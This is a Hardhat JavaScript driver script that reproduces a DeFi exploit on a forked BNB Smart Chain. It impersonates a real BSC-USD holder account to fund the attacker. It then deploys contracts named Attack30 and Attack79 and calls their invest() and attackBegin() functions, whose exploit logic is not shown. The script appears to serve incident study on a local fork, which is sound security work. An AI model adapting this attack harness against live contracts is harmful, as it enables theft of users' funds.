const {ethers, network} = require('hardhat');
const {deployContract} = require('./Attack-Deploy');


//全局变量
const BEP20USDTAbi = require('../artifacts//contracts/interface.sol/IERC20.json').abi;


async function main() {
    const users = await ethers.getSigners();
    const attacker = users[0];
    const attack30 = await deployContract('Attack30');
    await beforeAttack_tranferToAttack(attacker, await attack30.getAddress());
    console.log("=======Attack30 invest=======");
    await attack30.invest();

    const attack79 = await deployContract('Attack79', [await attack30.getAddress()]);
    await attack79.attackBegin();

}

// 给attack 转入 BSC-USD 资金，再由 attack 转入 attack30 BSC-USD资金
async function beforeAttack_tranferToAttack(attacker, attack30Addr) {
    //冒充一个有BSC_ USD代币的持有者
    await network.provider.request({
        method: "hardhat_impersonateAccount",
        params: ["0x53f78A071d04224B8e254E243fFfc6D9f2f3Fa23"],//要冒充的目标账户地址
    });
    const BSC_USD_Holder = await ethers.provider.getSigner("0x53f78A071d04224B8e254E243fFfc6D9f2f3Fa23");
    const BSC_USD = await ethers.getContractAt(BEP20USDTAbi, "0x55d398326f99059fF775485246999027B3197955", BSC_USD_Holder);

    const amountToTransfer = ethers.parseEther('1');
    await BSC_USD.transfer(attacker.address, amountToTransfer);
    console.log(`attacker balanceOf BSC-USD:${ethers.formatEther(await BSC_USD.balanceOf(attacker.address))}`);
    const amountToTransfer2 = ethers.parseEther('1');
    await BSC_USD.connect(attacker).transfer(attack30Addr, amountToTransfer2);
    console.log(`attack30Contract balanceOf BSC-USD:${ethers.formatEther(await BSC_USD.balanceOf(attack30Addr))}`);

}


main()